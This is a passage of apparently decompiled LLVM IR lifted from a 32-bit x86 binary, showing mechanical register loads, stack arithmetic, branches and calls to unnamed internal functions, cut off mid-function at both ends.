  %v3_8049baa = load i32, i32* %v2_8049baa, align 4
  %v1_8049bae = add i32 %v3_8049baa, 789
  %v9_8049bae = icmp eq i32 %v1_8049bae, 0
  store i1 %v9_8049bae, i1* %zf.global-to-local, align 1
  store i32 %v1_8049bae, i32* %eax.global-to-local, align 4
  %v3_8049bb3 = inttoptr i32 %v0_8049b9f to i32*
  store i32 %v1_8049bae, i32* %v3_8049bb3, align 4
  %v3_8049bb4 = call i32 @function_8051c60(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049bb4, i32* %eax.global-to-local, align 4
  %v0_8049bb9 = load i32, i32* @esp, align 4
  %v1_8049bb9 = add i32 %v0_8049bb9, 16
  %v6_8049bb9 = icmp eq i32 %v1_8049bb9, 0
  store i1 %v6_8049bb9, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8049bbc

dec_label_pc_8049bbc:                             ; preds = %dec_label_pc_8049b96, %dec_label_pc_8049b86, %dec_label_pc_8049ba7
  %v0_8049bbc = phi i32 [ %v1_8049b9f, %dec_label_pc_8049b96 ], [ %v1_8049b8f, %dec_label_pc_8049b86 ], [ %v1_8049bb9, %dec_label_pc_8049ba7 ]
  %v0_8049bbf = load i32, i32* @esi, align 4
  store i32 %v0_8049bbf, i32* %eax.global-to-local, align 4
  %v1_8049bc1 = add i32 %v0_8049bbc, 20900
  %v2_8049bc1 = inttoptr i32 %v1_8049bc1 to i32*
  %v3_8049bc1 = load i32, i32* %v2_8049bc1, align 4
  %v2_8049bc8 = add i32 %v0_8049bbf, 1
  %v1_8049bca = add i32 %v2_8049bc8, %v3_8049bc1
  %v8_8049bca = icmp eq i32 %v1_8049bca, 0
  store i1 %v8_8049bca, i1* %zf.global-to-local, align 1
  store i32 %v1_8049bca, i32* %eax.global-to-local, align 4
  %v2_8049bcb = add i32 %v0_8049bbc, -16
  %v3_8049bcb = inttoptr i32 %v2_8049bcb to i32*
  store i32 %v1_8049bca, i32* %v3_8049bcb, align 4
  %v2_8049bcc = call i32 @function_8051c40(i8* %v1_8048752)
  store i32 %v2_8049bcc, i32* @eax, align 4
  %v0_8049bd1 = load i32, i32* @esp, align 4
  %v1_8049bd1 = add i32 %v0_8049bd1, 16
  %v1_8049bd4 = add i32 %v2_8049bcc, -255
  %v6_8049bd4 = sub i32 254, %v2_8049bcc
  %v7_8049bd4 = and i32 %v6_8049bd4, %v2_8049bcc
  %v8_8049bd4 = icmp slt i32 %v7_8049bd4, 0
  %v9_8049bd4 = icmp eq i32 %v1_8049bd4, 0
  store i1 %v9_8049bd4, i1* %zf.global-to-local, align 1
  %v10_8049bd4 = icmp slt i32 %v1_8049bd4, 0
  %v3_8049bd9 = icmp eq i1 %v10_8049bd4, %v8_8049bd4
  %v4_8049bd9 = icmp eq i1 %v9_8049bd4, false
  %v5_8049bd9 = and i1 %v4_8049bd9, %v3_8049bd9
  br i1 %v5_8049bd9, label %dec_label_pc_804949f, label %dec_label_pc_8049bdf

dec_label_pc_8049bdf:                             ; preds = %dec_label_pc_8049bbc
  %v1_8049bdf = add i32 %v0_8049bd1, 92
  %v2_8049bdf = inttoptr i32 %v1_8049bdf to i32*
  %v3_8049bdf = load i32, i32* %v2_8049bdf, align 4
  store i32 %v3_8049bdf, i32* %ebx.global-to-local, align 4
  %v0_8049be3 = load i32, i32* @edi, align 4
  %v2_8049be3 = add i32 %v0_8049bd1, 12
  %v3_8049be3 = inttoptr i32 %v2_8049be3 to i32*
  store i32 %v0_8049be3, i32* %v3_8049be3, align 4
  %v0_8049be4 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049be4 = add i32 %v0_8049be4, 533
  %v9_8049be4 = icmp eq i32 %v1_8049be4, 0
  store i1 %v9_8049be4, i1* %zf.global-to-local, align 1
  store i32 %v1_8049be4, i32* @ebx, align 4
  %v0_8049bea = load i32, i32* @edi, align 4
  %v2_8049bea = add i32 %v0_8049bd1, 8
  %v3_8049bea = inttoptr i32 %v2_8049bea to i32*
  store i32 %v0_8049bea, i32* %v3_8049bea, align 4
  %v1_8049beb = add i32 %v0_8049bd1, 4
  %v2_8049beb = inttoptr i32 %v1_8049beb to i32*
  store i32 255, i32* %v2_8049beb, align 4
  %v0_8049bf0 = load i32, i32* @ebx, align 4
  %v3_8049bf0 = inttoptr i32 %v0_8049bd1 to i32*
  store i32 %v0_8049bf0, i32* %v3_8049bf0, align 4
  %v2_8049bf1 = call i32 @function_8051cd0(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_8049bf1, i32* %eax.global-to-local, align 4
  %v0_8049bf6 = load i32, i32* @esp, align 4
  %v1_8049bf6 = inttoptr i32 %v0_8049bf6 to i32*
  %v2_8049bf6 = load i32, i32* %v1_8049bf6, align 4
  store i32 %v2_8049bf6, i32* %ecx.global-to-local, align 4
  %v0_8049bf7 = load i32, i32* @esi, align 4
  store i32 %v0_8049bf7, i32* %eax.global-to-local, align 4
  %v1_8049bf9 = add i32 %v0_8049bf6, 20916
  %v2_8049bf9 = inttoptr i32 %v1_8049bf9 to i32*
  %v3_8049bf9 = load i32, i32* %v2_8049bf9, align 4
  store i32 %v3_8049bf9, i32* %edx.global-to-local, align 4
  %v2_8049c00 = add i32 %v0_8049bf7, 1
  %v1_8049c02 = add i32 %v2_8049c00, %v3_8049bf9
  %v8_8049c02 = icmp eq i32 %v1_8049c02, 0
  store i1 %v8_8049c02, i1* %zf.global-to-local, align 1
  store i32 %v1_8049c02, i32* %eax.global-to-local, align 4
  store i32 %v1_8049c02, i32* %v1_8049bf6, align 4
  %v2_8049c04 = call i32 @function_8051c40(i8* %v1_8048752)
  store i32 %v2_8049c04, i32* %eax.global-to-local, align 4
  %v0_8049c09 = load i32, i32* @esp, align 4
  %v1_8049c09 = add i32 %v0_8049c09, 16
  %v1_8049c0c = icmp eq i32 %v2_8049c04, 0
  store i1 %v1_8049c0c, i1* %zf.global-to-local, align 1
  %tmp148 = icmp slt i32 %v2_8049c04, 1
  br i1 %tmp148, label %dec_label_pc_804949f, label %dec_label_pc_8049c14

dec_label_pc_8049c14:                             ; preds = %dec_label_pc_8049cbd, %dec_label_pc_8049bdf
  %v1_8049c14 = phi i32 [ %v1_8049cd2, %dec_label_pc_8049cbd ], [ %v1_8049c09, %dec_label_pc_8049bdf ]
  %v0_8049c14 = phi i32 [ %v2_8049ccd, %dec_label_pc_8049cbd ], [ %v2_8049c04, %dec_label_pc_8049bdf ]
  %v2_8049c14 = add i32 %v1_8049c14, -4
  %v3_8049c14 = inttoptr i32 %v2_8049c14 to i32*
  store i32 %v0_8049c14, i32* %v3_8049c14, align 4
  %v0_8049c15 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049c15 = add i32 %v1_8049c14, -8
  %v3_8049c15 = inttoptr i32 %v2_8049c15 to i32*
  store i32 %v0_8049c15, i32* %v3_8049c15, align 4
  %v1_8049c16 = add i32 %v1_8049c14, 20900
  %v2_8049c16 = inttoptr i32 %v1_8049c16 to i32*
  %v3_8049c16 = load i32, i32* %v2_8049c16, align 4
  %v0_8049c1d = load i32, i32* @esi, align 4
  %v2_8049c1d = add i32 %v0_8049c1d, %v3_8049c16
  %v12_8049c1d = icmp eq i32 %v2_8049c1d, 0
  store i1 %v12_8049c1d, i1* %zf.global-to-local, align 1
  %v1_8049c1f = add i32 %v2_8049c1d, 1
  store i32 %v1_8049c1f, i32* %eax.global-to-local, align 4
  %v2_8049c22 = add i32 %v1_8049c14, -12
  %v3_8049c22 = inttoptr i32 %v2_8049c22 to i32*
  store i32 %v1_8049c1f, i32* %v3_8049c22, align 4
  %v0_8049c23 = load i32, i32* @ebx, align 4
  %v2_8049c23 = add i32 %v1_8049c14, -16
  %v3_8049c23 = inttoptr i32 %v2_8049c23 to i32*
  store i32 %v0_8049c23, i32* %v3_8049c23, align 4
  %v3_8049c24 = call i32 @function_8051c60(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049c24, i32* %eax.global-to-local, align 4
  %v0_8049c29 = load i32, i32* @esp, align 4
  %v1_8049c29 = add i32 %v0_8049c29, 16
  %v6_8049c29 = icmp eq i32 %v1_8049c29, 0
  store i1 %v6_8049c29, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_804949f

dec_label_pc_8049c31:                             ; preds = %dec_label_pc_80497f0
  %v1_8049c31 = add i32 %v0_80497e2, 108
  %v2_8049c31 = inttoptr i32 %v1_8049c31 to i32*
  %v3_8049c31 = load i32, i32* %v2_8049c31, align 4
  store i32 %v3_8049c31, i32* %ecx.global-to-local, align 4
  %v1_8049c35 = add i32 %v3_8049c31, -1448
  %v2_8049c35 = inttoptr i32 %v1_8049c35 to i8*
  %v3_8049c35 = load i8, i8* %v2_8049c35, align 1
  %v4_8049c35 = icmp eq i8 %v3_8049c35, 0
  store i1 %v4_8049c35, i1* %zf.global-to-local, align 1
  br i1 %v4_8049c35, label %dec_label_pc_8048d91, label %dec_label_pc_8049c42

dec_label_pc_8049c42:                             ; preds = %dec_label_pc_8049c31
  store i8 1, i8* %v2_8049c35, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_8049c4e:                             ; preds = %dec_label_pc_8049a77
  %v2_8049c4e = add i32 %v0_8049aa9, 12
  %v3_8049c4e = inttoptr i32 %v2_8049c4e to i32*
  store i32 %v0_8049aa4, i32* %v3_8049c4e, align 4
  %v2_8049c4f = add i32 %v0_8049aa9, 8
  %v3_8049c4f = inttoptr i32 %v2_8049c4f to i32*
  store i32 %v0_8049aa4, i32* %v3_8049c4f, align 4
  %v1_8049c50 = add i32 %v0_8049aa9, 4
  %v2_8049c50 = inttoptr i32 %v1_8049c50 to i32*
  store i32 ptrtoint ([4 x i8]* @global_var_8054af4.5 to i32), i32* %v2_8049c50, align 4
  %v0_8049c55 = load i32, i32* @ebx, align 4
  %v3_8049c55 = inttoptr i32 %v0_8049aa9 to i32*
  store i32 %v0_8049c55, i32* %v3_8049c55, align 4
  %v0_8049c56 = call i32 @function_8051fb0()
  store i32 %v0_8049c56, i32* %eax.global-to-local, align 4
  %v0_8049c5b = load i32, i32* @esp, align 4
  %v3_8049c5e = trunc i32 %v0_8049c56 to i8
  %v4_8049c5e = icmp eq i8 %v3_8049c5e, 0
  store i1 %v4_8049c5e, i1* %zf.global-to-local, align 1
  %v1_8049c60 = icmp eq i1 %v4_8049c5e, false
  br i1 %v1_8049c60, label %dec_label_pc_8049ab4, label %dec_label_pc_8049c66

dec_label_pc_8049c66:                             ; preds = %dec_label_pc_8049c4e
  %v1_8049c66 = add i32 %v0_8049c5b, 120
  %v2_8049c66 = inttoptr i32 %v1_8049c66 to i32*
  %v3_8049c66 = load i32, i32* %v2_8049c66, align 4
  %v4_8049c66 = load i32, i32* @esi, align 4
  %v5_8049c66 = sub i32 %v3_8049c66, %v4_8049c66
  %v11_8049c66 = xor i32 %v4_8049c66, %v3_8049c66
  %v12_8049c66 = xor i32 %v5_8049c66, %v3_8049c66
  %v13_8049c66 = and i32 %v12_8049c66, %v11_8049c66
  %v14_8049c66 = icmp slt i32 %v13_8049c66, 0
  %v15_8049c66 = icmp eq i32 %v5_8049c66, 0
  store i1 %v15_8049c66, i1* %zf.global-to-local, align 1
  %v16_8049c66 = icmp slt i32 %v5_8049c66, 0
  %v1_8049c6a = add i32 %v0_8049c5b, 108
  %v2_8049c6a = inttoptr i32 %v1_8049c6a to i32*
  %v3_8049c6a = load i32, i32* %v2_8049c6a, align 4
  store i32 %v3_8049c6a, i32* %ecx.global-to-local, align 4
  %v3_8049c6e = icmp eq i1 %v16_8049c66, %v14_8049c66
  %v4_8049c6e = icmp eq i1 %v15_8049c66, false
  %v5_8049c6e = and i1 %v4_8049c6e, %v3_8049c6e
  %v6_8049c6e = zext i1 %v5_8049c6e to i32
  %v8_8049c6e = and i32 %v0_8049c56, -256
  %v9_8049c6e = or i32 %v6_8049c6e, %v8_8049c6e
  %v2_8049c71 = mul i32 %v9_8049c6e, 8
  %v3_8049c71 = add nsw i32 %v9_8049c6e, 1
  %v4_8049c71 = add i32 %v3_8049c71, %v2_8049c71
  store i32 %v4_8049c71, i32* %eax.global-to-local, align 4
  %v1_8049c75 = trunc i32 %v4_8049c71 to i8
  %v3_8049c75 = add i32 %v3_8049c6a, -1448
  %v4_8049c75 = inttoptr i32 %v3_8049c75 to i8*
  store i8 %v1_8049c75, i8* %v4_8049c75, align 1
  br label %dec_label_pc_8049abf

dec_label_pc_8049c80:                             ; preds = %dec_label_pc_8049b6c, %dec_label_pc_8049b5b
  %v0_8049c80 = phi i32 [ %v0_8049b52, %dec_label_pc_8049b5b ], [ %v0_8049b80183, %dec_label_pc_8049b6c ]
  %v1_8049c80 = inttoptr i32 %v0_8049c80 to i8*
  store i8 0, i8* %v1_8049c80, align 1
  br label %dec_label_pc_8049b86

dec_label_pc_8049c88:                             ; preds = %dec_label_pc_8049496
  %v1_8049c88 = add i32 %v0_804948a, 92
  %v2_8049c88 = inttoptr i32 %v1_8049c88 to i32*
  %v3_8049c88 = load i32, i32* %v2_8049c88, align 4
  store i32 %v3_8049c88, i32* %ebx.global-to-local, align 4
  %v0_8049c8c = load i32, i32* @ebp, align 4
  %v2_8049c8c = add i32 %v0_804948a, 12
  %v3_8049c8c = inttoptr i32 %v2_8049c8c to i32*
  store i32 %v0_8049c8c, i32* %v3_8049c8c, align 4
  %v0_8049c8d = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049c8d = add i32 %v0_8049c8d, 533
  %v9_8049c8d = icmp eq i32 %v1_8049c8d, 0
  store i1 %v9_8049c8d, i1* %zf.global-to-local, align 1
  store i32 %v1_8049c8d, i32* @ebx, align 4
  %v0_8049c93 = load i32, i32* @ebp, align 4
  %v2_8049c93 = add i32 %v0_804948a, 8
  %v3_8049c93 = inttoptr i32 %v2_8049c93 to i32*
  store i32 %v0_8049c93, i32* %v3_8049c93, align 4
  %v1_8049c94 = add i32 %v0_804948a, 4
  %v2_8049c94 = inttoptr i32 %v1_8049c94 to i32*
  store i32 255, i32* %v2_8049c94, align 4
  %v0_8049c99 = load i32, i32* @ebx, align 4
  %v3_8049c99 = inttoptr i32 %v0_804948a to i32*
  store i32 %v0_8049c99, i32* %v3_8049c99, align 4
  %v2_8049c9a = call i32 @function_8051cd0(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_8049c9a, i32* %eax.global-to-local, align 4
  %v0_8049c9f = load i32, i32* @esp, align 4
  %v1_8049c9f = inttoptr i32 %v0_8049c9f to i32*
  %v2_8049c9f = load i32, i32* %v1_8049c9f, align 4
  store i32 %v2_8049c9f, i32* @edi, align 4
  %v0_8049ca0 = load i32, i32* @esi, align 4
  store i32 %v0_8049ca0, i32* %eax.global-to-local, align 4
  %v1_8049ca2 = add i32 %v0_8049c9f, 20916
  %v2_8049ca2 = inttoptr i32 %v1_8049ca2 to i32*
  %v3_8049ca2 = load i32, i32* %v2_8049ca2, align 4
  store i32 %v3_8049ca2, i32* %ecx.global-to-local, align 4
  %v2_8049ca9 = add i32 %v0_8049ca0, 1
  %v1_8049cab = add i32 %v2_8049ca9, %v3_8049ca2
  %v8_8049cab = icmp eq i32 %v1_8049cab, 0
  store i1 %v8_8049cab, i1* %zf.global-to-local, align 1
  store i32 %v1_8049cab, i32* %eax.global-to-local, align 4
  store i32 %v1_8049cab, i32* %v1_8049c9f, align 4
  %v2_8049cad = call i32 @function_8051c40(i8* %v1_8048752)
  store i32 %v2_8049cad, i32* %eax.global-to-local, align 4
  %v0_8049cb2 = load i32, i32* @esp, align 4
  %v1_8049cb2 = add i32 %v0_8049cb2, 16
  %v1_8049cb5 = icmp eq i32 %v2_8049cad, 0
  store i1 %v1_8049cb5, i1* %zf.global-to-local, align 1
  %tmp149 = icmp slt i32 %v2_8049cad, 1
  br i1 %tmp149, label %dec_label_pc_804949f, label %dec_label_pc_8049cbd

dec_label_pc_8049cbd:                             ; preds = %dec_label_pc_8049c88
  %v0_8049cc0 = load i32, i32* @esi, align 4
  store i32 %v0_8049cc0, i32* %eax.global-to-local, align 4
  %v1_8049cc2 = add i32 %v0_8049cb2, 20916
  %v2_8049cc2 = inttoptr i32 %v1_8049cc2 to i32*
  %v3_8049cc2 = load i32, i32* %v2_8049cc2, align 4
  store i32 %v3_8049cc2, i32* %edx.global-to-local, align 4
  %v2_8049cc9 = add i32 %v0_8049cc0, 1
  %v1_8049ccb = add i32 %v2_8049cc9, %v3_8049cc2
  %v8_8049ccb = icmp eq i32 %v1_8049ccb, 0
  store i1 %v8_8049ccb, i1* %zf.global-to-local, align 1
  store i32 %v1_8049ccb, i32* %eax.global-to-local, align 4
  %v3_8049ccc = inttoptr i32 %v0_8049cb2 to i32*
  store i32 %v1_8049ccb, i32* %v3_8049ccc, align 4
  %v2_8049ccd = call i32 @function_8051c40(i8* %v1_8048752)
  store i32 %v2_8049ccd, i32* %eax.global-to-local, align 4
  %v0_8049cd2 = load i32, i32* @esp, align 4
  %v1_8049cd2 = add i32 %v0_8049cd2, 16
  %v1_8049cd5 = add i32 %v2_8049ccd, -255
  %v6_8049cd5 = sub i32 254, %v2_8049ccd
  %v7_8049cd5 = and i32 %v6_8049cd5, %v2_8049ccd
  %v8_8049cd5 = icmp slt i32 %v7_8049cd5, 0
  %v9_8049cd5 = icmp eq i32 %v1_8049cd5, 0
  store i1 %v9_8049cd5, i1* %zf.global-to-local, align 1
  %v10_8049cd5 = icmp slt i32 %v1_8049cd5, 0
  %v3_8049cda = icmp eq i1 %v10_8049cd5, %v8_8049cd5
  %v4_8049cda = icmp eq i1 %v9_8049cd5, false
  %v5_8049cda = and i1 %v4_8049cda, %v3_8049cda
  br i1 %v5_8049cda, label %dec_label_pc_804949f, label %dec_label_pc_8049c14

dec_label_pc_8049ce5:                             ; preds = %dec_label_pc_8049ec7, %dec_label_pc_8049eb6
  %v0_8049ce5 = phi i32 [ %v0_8049eac, %dec_label_pc_8049eb6 ], [ %v0_8049edb207, %dec_label_pc_8049ec7 ]
  %v1_8049ce5 = inttoptr i32 %v0_8049ce5 to i8*
  store i8 0, i8* %v1_8049ce5, align 1
  br label %dec_label_pc_8049ce8

dec_label_pc_8049ce8:                             ; preds = %dec_label_pc_8049ec0, %dec_label_pc_8049ec7.dec_label_pc_8049ed1_crit_edge, %dec_label_pc_8049e86, %dec_label_pc_8049ce5
  %v0_8049ce8 = load i32, i32* @esp, align 4
  %v9_8049ce8 = icmp eq i32 %v0_8049ce8, 12
  store i1 %v9_8049ce8, i1* %zf.global-to-local, align 1
  %v0_8049ceb = load i32, i32* @ebx, align 4
  %v2_8049ceb = add i32 %v0_8049ce8, -16
  %v3_8049ceb = inttoptr i32 %v2_8049ceb to i32*
  store i32 %v0_8049ceb, i32* %v3_8049ceb, align 4
  %v2_8049cec = call i32 @function_8051c40(i8* %v1_8048752)
  store i32 %v2_8049cec, i32* %eax.global-to-local, align 4
  %v0_8049cf1 = load i32, i32* @esp, align 4
  %v1_8049cf1 = add i32 %v0_8049cf1, 16
  %v1_8049cf4 = icmp eq i32 %v2_8049cec, 0
  store i1 %v1_8049cf4, i1* %zf.global-to-local, align 1
  %tmp150 = icmp slt i32 %v2_8049cec, 1
  br i1 %tmp150, label %dec_label_pc_8049d1e, label %dec_label_pc_8049cf8

dec_label_pc_8049cf8:                             ; preds = %dec_label_pc_8049ce8
  %v9_8049cf8 = icmp eq i32 %v0_8049cf1, -4
  store i1 %v9_8049cf8, i1* %zf.global-to-local, align 1
  %v0_8049cfb = load i32, i32* @ebx, align 4
  %v3_8049cfb = inttoptr i32 %v0_8049cf1 to i32*
  store i32 %v0_8049cfb, i32* %v3_8049cfb, align 4
  %v2_8049cfc = call i32 @function_8051c40(i8* %v1_8048752)
  store i32 %v2_8049cfc, i32* %eax.global-to-local, align 4
  %v0_8049d01 = load i32, i32* @esp, align 4
  %v1_8049d01 = add i32 %v0_8049d01, 16
  %v1_8049d04 = add i32 %v2_8049cfc, -127
  %v6_8049d04 = sub i32 126, %v2_8049cfc
  %v7_8049d04 = and i32 %v6_8049d04, %v2_8049cfc
  %v8_8049d04 = icmp slt i32 %v7_8049d04, 0
  %v9_8049d04 = icmp eq i32 %v1_8049d04, 0
  store i1 %v9_8049d04, i1* %zf.global-to-local, align 1
  %v10_8049d04 = icmp slt i32 %v1_8049d04, 0
  %v3_8049d07 = icmp eq i1 %v10_8049d04, %v8_8049d04
  %v4_8049d07 = icmp eq i1 %v9_8049d04, false
  %v5_8049d07 = and i1 %v4_8049d07, %v3_8049d07
  br i1 %v5_8049d07, label %dec_label_pc_8049d1e, label %dec_label_pc_8049d09

dec_label_pc_8049d09:                             ; preds = %dec_label_pc_8049cf8
  %v2_8049d09 = add i32 %v0_8049d01, 12
  %v3_8049d09 = inttoptr i32 %v2_8049d09 to i32*
  store i32 %v2_8049cfc, i32* %v3_8049d09, align 4
  %v2_8049d0a = add i32 %v0_8049d01, 8
  %v3_8049d0a = inttoptr i32 %v2_8049d0a to i32*
  store i32 %v2_8049cfc, i32* %v3_8049d0a, align 4
  %v0_8049d0b = load i32, i32* @ebx, align 4
  %v2_8049d0b = add i32 %v0_8049d01, 4
  %v3_8049d0b = inttoptr i32 %v2_8049d0b to i32*
  store i32 %v0_8049d0b, i32* %v3_8049d0b, align 4
  %v1_8049d0c = add i32 %v0_8049d01, 92
  %v2_8049d0c = inttoptr i32 %v1_8049d0c to i32*
  %v3_8049d0c = load i32, i32* %v2_8049d0c, align 4
  %v1_8049d10 = add i32 %v3_8049d0c, 789
  %v9_8049d10 = icmp eq i32 %v1_8049d10, 0
  store i1 %v9_8049d10, i1* %zf.global-to-local, align 1
  store i32 %v1_8049d10, i32* %eax.global-to-local, align 4
  %v3_8049d15 = inttoptr i32 %v0_8049d01 to i32*
  store i32 %v1_8049d10, i32* %v3_8049d15, align 4
  %v3_8049d16 = call i32 @function_8051c60(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049d16, i32* %eax.global-to-local, align 4
  %v0_8049d1b = load i32, i32* @esp, align 4
  %v1_8049d1b = add i32 %v0_8049d1b, 16
  %v6_8049d1b = icmp eq i32 %v1_8049d1b, 0
  store i1 %v6_8049d1b, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8049d1e

dec_label_pc_8049d1e:                             ; preds = %dec_label_pc_8049cf8, %dec_label_pc_8049ce8, %dec_label_pc_8049a40, %dec_label_pc_8049d09
  %v0_8049d1e = phi i32 [ %v1_8049d01, %dec_label_pc_8049cf8 ], [ %v1_8049cf1, %dec_label_pc_8049ce8 ], [ %v1_8049a34, %dec_label_pc_8049a40 ], [ %v1_8049d1b, %dec_label_pc_8049d09 ]
  %v0_8049d21 = load i32, i32* @ebx, align 4
  store i32 %v0_8049d21, i32* %eax.global-to-local, align 4
  %v1_8049d23 = add i32 %v0_8049d1e, 20900
  %v2_8049d23 = inttoptr i32 %v1_8049d23 to i32*
  %v3_8049d23 = load i32, i32* %v2_8049d23, align 4
  store i32 %v3_8049d23, i32* @ebp, align 4
  %v2_8049d2a = add i32 %v0_8049d21, 1
  %v1_8049d2c = add i32 %v2_8049d2a, %v3_8049d23
  %v8_8049d2c = icmp eq i32 %v1_8049d2c, 0
  store i1 %v8_8049d2c, i1* %zf.global-to-local, align 1
  store i32 %v1_8049d2c, i32* %eax.global-to-local, align 4
  %v2_8049d2d = add i32 %v0_8049d1e, -16
  %v3_8049d2d = inttoptr i32 %v2_8049d2d to i32*
  store i32 %v1_8049d2c, i32* %v3_8049d2d, align 4
  %v2_8049d2e = call i32 @function_8051c40(i8* %v1_8048752)
  store i32 %v2_8049d2e, i32* @eax, align 4
  %v0_8049d33 = load i32, i32* @esp, align 4
  %v1_8049d33 = add i32 %v0_8049d33, 16
  %v1_8049d36 = add i32 %v2_8049d2e, -255
  %v6_8049d36 = sub i32 254, %v2_8049d2e
  %v7_8049d36 = and i32 %v6_8049d36, %v2_8049d2e
  %v8_8049d36 = icmp slt i32 %v7_8049d36, 0
  %v9_8049d36 = icmp eq i32 %v1_8049d36, 0
  store i1 %v9_8049d36, i1* %zf.global-to-local, align 1
  %v10_8049d36 = icmp slt i32 %v1_8049d36, 0
  %v3_8049d3b = icmp eq i1 %v10_8049d36, %v8_8049d36
  %v4_8049d3b = icmp eq i1 %v9_8049d36, false
  %v5_8049d3b = and i1 %v4_8049d3b, %v3_8049d3b
  br i1 %v5_8049d3b, label %dec_label_pc_8049a49, label %dec_label_pc_8049d41

dec_label_pc_8049d41:                             ; preds = %dec_label_pc_8049d1e
  %v1_8049d41 = add i32 %v0_8049d33, 92
  %v2_8049d41 = inttoptr i32 %v1_8049d41 to i32*
  %v3_8049d41 = load i32, i32* %v2_8049d41, align 4
  store i32 %v3_8049d41, i32* %esi.global-to-local, align 4
  %v0_8049d45 = load i32, i32* @edi, align 4
  %v2_8049d45 = add i32 %v0_8049d33, 12
  %v3_8049d45 = inttoptr i32 %v2_8049d45 to i32*
  store i32 %v0_8049d45, i32* %v3_8049d45, align 4
  %v0_8049d46 = load i32, i32* %esi.global-to-local, align 4
  %v1_8049d46 = add i32 %v0_8049d46, 533
  %v9_8049d46 = icmp eq i32 %v1_8049d46, 0
  store i1 %v9_8049d46, i1* %zf.global-to-local, align 1
  store i32 %v1_8049d46, i32* @esi, align 4
  %v0_8049d4c = load i32, i32* @edi, align 4
  %v2_8049d4c = add i32 %v0_8049d33, 8
  %v3_8049d4c = inttoptr i32 %v2_8049d4c to i32*
  store i32 %v0_8049d4c, i32* %v3_8049d4c, align 4
  %v1_8049d4d = add i32 %v0_8049d33, 4
  %v2_8049d4d = inttoptr i32 %v1_8049d4d to i32*
  store i32 255, i32* %v2_8049d4d, align 4
  %v0_8049d52 = load i32, i32* @esi, align 4
  %v3_8049d52 = inttoptr i32 %v0_8049d33 to i32*
  store i32 %v0_8049d52, i32* %v3_8049d52, align 4
  %v2_8049d53 = call i32 @function_8051cd0(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_8049d53, i32* %eax.global-to-local, align 4
  %v0_8049d58 = load i32, i32* @esp, align 4
  %v1_8049d58 = inttoptr i32 %v0_8049d58 to i32*
  %v2_8049d58 = load i32, i32* %v1_8049d58, align 4
  store i32 %v2_8049d58, i32* %ecx.global-to-local, align 4
  %v0_8049d59 = load i32, i32* @ebx, align 4
  store i32 %v0_8049d59, i32* %eax.global-to-local, align 4
  %v1_8049d5b = add i32 %v0_8049d58, 20916
  %v2_8049d5b = inttoptr i32 %v1_8049d5b to i32*
  %v3_8049d5b = load i32, i32* %v2_8049d5b, align 4
  store i32 %v3_8049d5b, i32* %edx.global-to-local, align 4
  %v2_8049d62 = add i32 %v0_8049d59, 1
  %v1_8049d64 = add i32 %v2_8049d62, %v3_8049d5b
  %v8_8049d64 = icmp eq i32 %v1_8049d64, 0
  store i1 %v8_8049d64, i1* %zf.global-to-local, align 1
  store i32 %v1_8049d64, i32* %eax.global-to-local, align 4
  store i32 %v1_8049d64, i32* %v1_8049d58, align 4
  %v2_8049d66 = call i32 @function_8051c40(i8* %v1_8048752)
  store i32 %v2_8049d66, i32* %eax.global-to-local, align 4
  %v0_8049d6b = load i32, i32* @esp, align 4
  %v1_8049d6b = add i32 %v0_8049d6b, 16
  %v1_8049d6e = icmp eq i32 %v2_8049d66, 0
  store i1 %v1_8049d6e, i1* %zf.global-to-local, align 1
  %tmp151 = icmp slt i32 %v2_8049d66, 1
  br i1 %tmp151, label %dec_label_pc_8049a49, label %dec_label_pc_8049d76

dec_label_pc_8049d76:                             ; preds = %dec_label_pc_8049d41
  %v0_8049d76 = load i32, i32* @ebp, align 4
  %v2_8049d76 = add i32 %v0_8049d6b, 12
  %v3_8049d76 = inttoptr i32 %v2_8049d76 to i32*
  store i32 %v0_8049d76, i32* %v3_8049d76, align 4
  %v0_8049d77 = load i32, i32* @ebp, align 4
  %v2_8049d77 = add i32 %v0_8049d6b, 8
  %v3_8049d77 = inttoptr i32 %v2_8049d77 to i32*
  store i32 %v0_8049d77, i32* %v3_8049d77, align 4
  %v1_8049d78 = add i32 %v0_8049d6b, 20916
  %v2_8049d78 = inttoptr i32 %v1_8049d78 to i32*
  %v3_8049d78 = load i32, i32* %v2_8049d78, align 4
  store i32 %v3_8049d78, i32* @edi, align 4
  %v0_8049d7f = load i32, i32* @ebx, align 4
  %v2_8049d7f = add i32 %v0_8049d7f, %v3_8049d78
  %v12_8049d7f = icmp eq i32 %v2_8049d7f, 0
  store i1 %v12_8049d7f, i1* %zf.global-to-local, align 1
  store i32 %v2_8049d7f, i32* @ebx, align 4
  %v1_8049d81 = add i32 %v2_8049d7f, 1
  store i32 %v1_8049d81, i32* %eax.global-to-local, align 4
  %v2_8049d84 = add i32 %v0_8049d6b, 4
  %v3_8049d84 = inttoptr i32 %v2_8049d84 to i32*
  store i32 %v1_8049d81, i32* %v3_8049d84, align 4
  %v0_8049d85 = load i32, i32* @esi, align 4
  %v3_8049d85 = inttoptr i32 %v0_8049d6b to i32*
  store i32 %v0_8049d85, i32* %v3_8049d85, align 4
  %v3_8049d86 = call i32 @function_8051c60(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049d86, i32* %eax.global-to-local, align 4
  %v0_8049d8b = load i32, i32* @esp, align 4
  %v1_8049d8b = add i32 %v0_8049d8b, 16
  %v6_8049d8b = icmp eq i32 %v1_8049d8b, 0
  store i1 %v6_8049d8b, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8049a49

dec_label_pc_8049d93:                             ; preds = %dec_label_pc_8049b1d
  %v0_8049d93 = load i32, i32* @esp, align 4
  %v1_8049d93 = add i32 %v0_8049d93, 20900
